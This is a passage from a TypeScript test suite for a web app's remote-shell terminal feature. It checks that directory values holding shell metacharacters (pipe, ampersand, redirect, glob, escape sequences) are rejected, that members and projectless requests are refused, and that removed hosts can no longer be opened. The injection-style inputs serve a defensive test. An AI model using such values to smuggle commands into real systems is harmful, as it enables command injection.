      '/srv/a|b',
      '/srv/a&b',
      '/srv/a>b',
      '/srv/a*',
      '/srv/a\\b',
      '/srv/a\tb',
      `/srv/${String.fromCharCode(27)}[2J`,
      '/srv/世界',
      `/${'d'.repeat(300)}`,
      '',
      7,
      ['/srv'],
    ]) {
      const refused = await post({ remote: { hostId: 'build-box', directory } });
      expect(refused.status, JSON.stringify(directory)).toBe(400);
      expect(refused.body).toMatchObject({ error: { code: 'invalid_request' } });
    }

    // Not one of those attempts started the SSH client or left a session behind.
    expect(bench.world.calls()).toEqual([]);
    expect(bench.world.tmuxLog()).toEqual([]);
    expect(bench.t.studio.context.services.terminal.liveSessionCount).toBe(0);

    // A member cannot open one, and the remote launchers are not available without a project.
    const member = await bench.t.member();
    expect((await member.post('/api/terminal/sessions', { projectId: bench.project.id, launcher: 'remote-shell', remote: { hostId: 'build-box' } })).status).toBe(403);
    expect((await bench.owner.post('/api/terminal/sessions', { launcher: 'remote-shell', remote: { hostId: 'build-box' } })).body).toMatchObject({ error: { code: 'project_required' } });

    // What does go through reaches the remote side as one plain parameter.
    const odd = path.join(path.dirname(bench.world.remoteWork), 'v1.2+build@host_x-y');
    await mkdir(odd);
    const { terminal } = await bench.open({ launcher: 'remote-shell', remote: { hostId: 'build-box', directory: odd } });
    await terminal.expectOutput('attached-to-pretend-tmux');
    expect(await run(terminal, 'pwd')).toBe(odd);
    const [args] = bench.world.calls();
    expect(args![args!.length - 1]).toContain(` '${odd}' 'studio-shell-`);
    expect(args!.slice(args!.indexOf('--') + 1, -1)).toEqual(['build.internal.example']);
  });

  it('stops offering a host the moment the operator removes it', async () => {
    const bench = await start();
    const { terminal } = await bench.open({ launcher: 'remote-shell', remote: { hostId: 'build-box' } });
    await terminal.expectOutput('attached-to-pretend-tmux');
    await bench.writeHosts({ hosts: [{ id: 'bastion', name: 'Bastion', hostname: 'bastion.example' }] });
    const refused = await bench.owner.post('/api/terminal/sessions', { projectId: bench.project.id, launcher: 'remote-shell', remote: { hostId: 'build-box' } });
    expect(refused.status).toBe(404);
    expect(refused.body).toMatchObject({ error: { code: 'remote_host_not_found' } });
    // And with a file that is rejected, nothing can be opened at all.
    await bench.writeHosts('{ not json');
    const invalid = await bench.owner.post('/api/terminal/sessions', { projectId: bench.project.id, launcher: 'remote-shell', remote: { hostId: 'bastion' } });
    expect(invalid.status).toBe(503);
    expect(invalid.body).toMatchObject({ error: { code: 'remote_hosts_invalid', details: { problem: 'the file is not valid JSON' } } });
    expect(bench.world.calls()).toHaveLength(1);
  });
});
